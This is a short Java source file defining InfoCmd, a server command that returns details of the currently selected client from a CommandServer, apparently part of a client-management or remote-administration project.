package commands;

import server.CommandServer;
import tools.ParsedCommand;

/**
 * Display detailed client info
 * 
 * @author Yohan Chalier
 *
 */
public class InfoCmd extends ServerCommand {

	public InfoCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {
		if (c2.getCurrentClient() >= 0) {					
			return c2.getClients().get(c2.getCurrentClient()).toString();
		}
		return "No selected client.";
	}

}
